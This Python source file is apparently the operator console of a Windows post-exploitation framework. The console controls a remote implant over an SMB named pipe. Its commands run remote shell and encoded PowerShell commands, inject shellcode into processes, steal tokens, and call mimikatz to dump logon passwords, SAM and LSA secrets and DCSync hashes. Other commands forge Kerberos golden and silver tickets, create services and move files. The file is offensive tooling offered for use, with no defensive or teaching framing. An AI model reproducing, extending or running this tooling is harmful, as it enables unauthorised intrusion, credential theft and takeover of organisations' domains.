# -*- coding: UTF-8 -*-

import logging
import os
import random
import traceback
import winsound

from framework import utils
from framework.connector import log_smb_info
from framework.connector import open_namedpipe
from framework.connector import receive_data
from framework.resources import INTRO
from .control import Controller


class PikachuCLI(Controller):

    def run(self):
        try:
            self.tid = self.smb_conn.connectTree("IPC$")
            self.fid = open_namedpipe(self.smb_conn, self.tid, self.pipe_name)
            x64, data = receive_data(self.smb_conn, self.tid, self.fid, self.pipe_name, self.traffic)
            self.x64 = bool(x64)

            data = data.decode("utf_16_le")
            self.pid, self.current_dir, self.username = data.split("|")

            ip = self.smb_conn.getRemoteHost()
            arc = "64-bit" if self.x64 else "32-bit"
        except Exception as e:
            if type(e) != KeyboardInterrupt:
                logging.debug(traceback.format_exc())
            logging.error(e)
            return

        if os.name == "nt":
            os.system("title {} ^| Pikachu".format(ip))
        else:
            utils.write(b'\33]0;{} | Pikachu\a'.format(ip))

        utils.write(INTRO)
        log_smb_info(self.smb_conn)
        logging.info(u"Architect  :\t{}".format(arc))
        logging.info(u"Process ID :\t{}".format(self.pid))
        utils.writeline()

        winsound.PlaySound("*", winsound.SND_NOSTOP | winsound.SND_ASYNC)
        self.prompt = u"({1}) {0}> ".format(self.current_dir, self.username)
        self.cmdloop()

    def cmdloop(self, intro=None):
        try:
            import readline
            self.old_completer = readline.get_completer()
            readline.set_completer(self.complete)
            if os.name == "nt":
                readline.rl.allow_ctrl_c = True
            readline.parse_and_bind(self.completekey + ": complete")
            readline.parse_and_bind("control-v: paste")
            readline.parse_and_bind("control-c: copy")
            if os.path.exists(self.history_file):
                readline.read_history_file(self.history_file)
        except ImportError:
            readline = None

        stop = None
        while not stop:
            try:
                line = raw_input(self.prompt)
            except EOFError:
                line = 'EOF'
            stop = self.onecmd(line)

        if readline is not None:
            readline.set_completer(self.old_completer)
            try:
                if os.path.exists(self.history_file):
                    os.remove(self.history_file)
                readline.write_history_file(self.history_file)
            except:
                pass

    def onecmd(self, line):
        utils.writeline()
        cmd, arg, line = self.parseline(line)
        if not line:
            return
        if cmd is None:
            return
        self.lastcmd = line
        if line == 'EOF':
            return self.do_exit(line)
        if cmd == '':
            return

        try:
            func = getattr(self, 'do_' + cmd)
        except AttributeError:
            return

        utils.log_to_file(logging.INFO, self.prompt + line)
        try:
            result = func(arg)
            utils.writeline()
            return result
        except Exception as e:
            logging.debug(traceback.format_exc())
            logging.error(e)
            utils.writeline()
            if utils.is_disconnected(str(e)):
                return True

    @staticmethod
    def do_clear(line):
        """
        Clear console output
        """
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")

    def do_exit(self, line):
        self.ctrl_exit()
        return True

    def do_kill(self, line):
        """
        Kill process with PID
        Example: kill 123456
        """
        self.ctrl_kill_process(line)

    def do_thread_kill(self, line):
        """
        Kill sub thread with ThreadID
        Example: thread_kill 123456
        """
        self.ctrl_kill_thread(line)

    def do_shell(self, line):
        """
        Execute commands with cmd

        shell tasklist /v
        """
        self.ctrl_execute_command(line)

    def do_ps(self, line):
        self.ctrl_list_processes()

    def do_whoami(self, line):
        self.ctrl_execute_quick_command(u"whoami")

    def do_del(self, line):
        self.ctrl_execute_quick_command(u"erase /f /q {}".format(line))

    def do_rmdir(self, line):
        self.ctrl_execute_quick_command(u"rmdir /s /q {}".format(line))

    def do_echo(self, line):
        self.ctrl_execute_quick_command(u"echo {}".format(line))

    def do_mkdir(self, line):
        self.ctrl_execute_quick_command(u"mkdir {}".format(line))

    def do_tasklist(self, line):
        self.ctrl_execute_command("tasklist /v")

    def do_netstat(self, line):
        self.ctrl_execute_command("netstat /ano")

    def do_putty(self, line):
        """
        Open command line emulator
        """
        self.ctrl_putty()

    def do_dir(self, line):
        """
        List file in directory

        dir C:\directory_name
        """
        self.ctrl_list_files()

    def do_cd(self, line):
        if len(line) == 0:
            self.ctl_get_current_dir()
        else:
            self.ctl_set_current_dir(line)

    def do_download(self, line):
        self.ctrl_download_file(line)

    def do_upload(self, line):
        self.ctrl_upload_file(line)

    def do_shellcode(self, line):
        """
        Load shellcode x86 into new process

        load_shellcode "C:\\Path to shell file x86.bin"
        """
        self.ctrl_shellcode(line, x64=False)

    def do_shellcode64(self, line):
        """
        Load shellcode x64 into new process

        load_shellcode64 "C:\\Path to shell file x64.bin"
        """
        self.ctrl_shellcode(line, x64=True)

    def do_inject_shellcode(self, line):
        """
        Inject shellcode x86 into process with PID

        inject_shellcode 1234 "C:\\Path to shell file x86.bin"
        """
        self.ctrl_shellcode_inject(line, x64=False)

    def do_inject_shellcode64(self, line):
        """
        Inject shellcode x64 into process with PID

        inject_shellcode64 1234 "C:\\Path to shell file x64.bin"
        """
        self.ctrl_shellcode_inject(line, x64=True)

    def do_shellcode_token(self, line):
        """
        Steal token from a process with PID,
        then load shellcode x86 into new process

        shellcode_token 1234 "C:\\Path to shell file x86.bin"
        """
        self.ctrl_shellcode_token(line, x64=False)

    def do_shellcode_token64(self, line):
        """
        Steal token from a process with PID,
        then load shellcode x64 into new process

        shellcode_token64 1234 "C:\\Path to shell file x64.bin"
        """
        self.ctrl_shellcode_token(line, x64=True)

    # def do_shellcode_local(self, line):
    #     """
    #     Load shellcode x86 into current process

    #     shellcode_local "C:\\Path to shell file x86.bin"
    #     """
    #     self.ctrl_shellcode_local(line, x64=False)

    # def do_shellcode_local64(self, line):
    #     """
    #     Load shellcode x64 into current process

    #     shellcode_local64 "C:\\Path to shell file x64.bin"
    #     """
    #     self.ctrl_shellcode_local(line, x64=True)

    def do_logonpasswords(self, line):
        self.ctrl_mimikatz("sekurlsa::logonPasswords", get_output=True)

    def do_lsadump_sam(self, line):
        self.ctrl_mimikatz("lsadump::sam", get_output=True)

    def do_lsadump_lsa(self, line):
        self.ctrl_mimikatz("\"lsadump::lsa /inject\"", get_output=True)

    def do_lsadump_dcsync(self, line):
        self.ctrl_mimikatz("\"lsadump::dcsync /all\"", get_output=True)

    def do_ticket_golden(self, line):
        """
        ticket_silver [domain] [User] [NTLM Hash]

        ticket_silver domain.local Administrator 229db05851a8797603cbd313b92a334e
        """
        try:
            param_domain, param_user, param_rc4 = line.split(" ")
        except Exception as e:
            logging.info(e)
            return

        param_ticket = "{}.kirbi".format(utils.get_random_name())
        logging.info("Creating and saving ticket: {}".format(param_ticket))
        self.ctrl_mimikatz(
            "\"kerberos::golden /domain:{0} /user:{1} /rc4:{2} /ticket:{3}\"".format(
                param_domain, param_user, param_rc4, param_ticket
            ),
            get_output=True)

    def do_ticket_silver(self, line):
        """
        ticket_silver [domain] [User] [NTLM Hash] [Target hostname]

        ticket_silver domain.local Administrator 229db05851a8797603cbd313b92a334e TARGET.domain.local
        """
        try:
            param_domain, param_user, param_rc4, param_target = line.split(" ")
        except Exception as e:
            logging.info(e)
            return

        param_service = random.choice(["host", "cifs", "rpcss", "http"])
        param_ticket = "{}.kirbi".format(utils.get_random_name())
        logging.info("Creating and saving ticket: {}".format(param_ticket))
        self.ctrl_mimikatz(
            "\"kerberos::golden /domain:{0} /user:{1} /rc4:{2} /target:{3} /service:{4} /ticket:{5}\"".format(
                param_domain, param_user, param_rc4, param_target, param_service, param_ticket
            ),
            get_output=True)

    def do_ticket_export(self, line):
        self.ctrl_mimikatz("\"kerberos::list /export\"", get_output=True)

    def do_mimikatz(self, line):
        """
        Run mimikatz commands

        mimikatz "lsadump::lsa /patch"
        """
        self.ctrl_mimikatz(line, get_output=True)

    def do_powershell(self, line):
        self.ctrl_powershell(line, encode=False, get_output=True)

    def do_powershell_enc(self, line):
        self.ctrl_powershell(line, encode=True, get_output=True)

    def do_powershell_file(self, line):
        self.ctrl_powershell_file(line, get_output=True)

    def do_local_logonpasswords(self, line):
        self.ctrl_mimikatz("sekurlsa::logonPasswords", get_output=False)

    def do_local_lsadump_sam(self, line):
        self.ctrl_mimikatz("lsadump::sam", get_output=False)

    def do_local_lsadump_lsa(self, line):
        self.ctrl_mimikatz("\"lsadump::lsa /inject\"", get_output=False)

    def do_local_lsadump_dcsync(self, line):
        self.ctrl_mimikatz("\"lsadump::dcsync /all\"", get_output=False)

    def do_local_mimikatz(self, line):
        self.ctrl_mimikatz(line, get_output=False)

    def do_local_powershell(self, line):
        self.ctrl_powershell(line, encode=False, get_output=False)

    def do_local_powershell_enc(self, line):
        self.ctrl_powershell(line, encode=True, get_output=False)

    def do_local_powershell_file(self, line):
        self.ctrl_powershell_file(line, get_output=False)

    def do_create_service(self, line):
        return self.create_service(line)

    def do_delete_service(self, line):
        return self.delete_service(line)

    def do_check_http(self, line):
        """
        check_http <IPv4 or url>
        """
        return self.ctl_send_http(line)

    def do_check_dns(self, line):
        """
        check_dns <IPv4>
        """
        return self.ctl_send_dns(line)

    def do_check_icmp(self, line):
        """
        check_icmp <IPv4>
        """
        return self.ctl_send_icmp(line)

    def do_check_tcp(self, line):
        """
        check_tcp <IPv4> <Port>
        """
        return self.ctl_send_tcp(line)
